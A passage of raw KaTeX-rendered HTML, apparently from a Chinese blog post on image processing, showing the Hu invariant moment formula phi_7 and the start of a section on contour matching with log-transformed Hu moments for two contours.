class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">[</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>h</mi><msub><mi>i</mi><mn>7</mn></msub><mo>=</mo><mo stretchy="false">(</mo><mn>3</mn><msub><mi>η</mi><mn>21</mn></msub><mo>−</mo><msub><mi>η</mi><mn>03</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>+</mo><msub><mi>η</mi><mn>12</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">[</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>+</mo><msub><mi>η</mi><mn>12</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>−</mo><mn>3</mn><mo stretchy="false">(</mo><msub><mi>η</mi><mn>21</mn></msub><mo>+</mo><msub><mi>η</mi><mn>03</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">]</mo><mo>+</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>−</mo><mn>3</mn><msub><mi>η</mi><mn>12</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>21</mn></msub><mo>+</mo><msub><mi>η</mi><mn>03</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">(</mo><msub><mi>η</mi><mn>30</mn></msub><mo>+</mo><msub><mi>η</mi><mn>12</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>−</mo><mo stretchy="false">(</mo><msub><mi>η</mi><mn>21</mn></msub><mo>+</mo><msub><mi>η</mi><mn>03</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">phi_7 = (3\eta_{21}-\eta_{03})(\eta_{30}+\eta_{12})[(\eta_{30}+\eta_{12})^2-3(\eta_{21}+\eta_{03})^2]  +(\eta_{30}-3\eta_{12})(\eta_{21}+\eta_{03})[3(\eta_{30}+\eta_{12})^2-(\eta_{21}+\eta_{03})^2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">[</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">[</span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span></span></p><h4 id="基于hu的轮廓匹配"><a class="markdownIt-Anchor" href="#基于hu的轮廓匹配"></a> 基于Hu的轮廓匹配</h4><ul><li>两个轮廓的参数计算公式：</li><li>轮廓A的Hu距</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>m</mi><mi>i</mi><mi>A</mi></msubsup><mo>=</mo><mi>s</mi><mi>i</mi><mi>g</mi><mi>n</mi><mo stretchy="false">(</mo><msubsup><mi>h</mi><mi>i</mi><mi>A</mi></msubsup><mo stretchy="false">)</mo><mo separator="true">⋅</mo><mi>log</mi><mo>⁡</mo><msubsup><mi>h</mi><mi>i</mi><mi>A</mi></msubsup></mrow><annotation encoding="application/x-tex">m_i^A=sign(h_i^A)·\log{h_i^A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138331em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>轮廓B的Hu距</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>m</mi><mi>i</mi><mi>B</mi></msubsup><mo>=</mo><mi>s</mi><mi>i</mi><mi>g</mi><mi>n</mi><mo stretchy="false">(</mo><msubsup><mi>h</mi><mi>i</mi><mi>B</mi></msubsup><mo stretchy="false">)</mo><mo separator="true">⋅</mo><mi>log</mi><mo>⁡</mo><msubsup><mi>h</mi><mi>i</mi><mi>B</mi></msubsup></mrow><annotation encoding="application/x-tex">m_i^B=sign(h_i^B)·\log{h_i^B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138331em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span 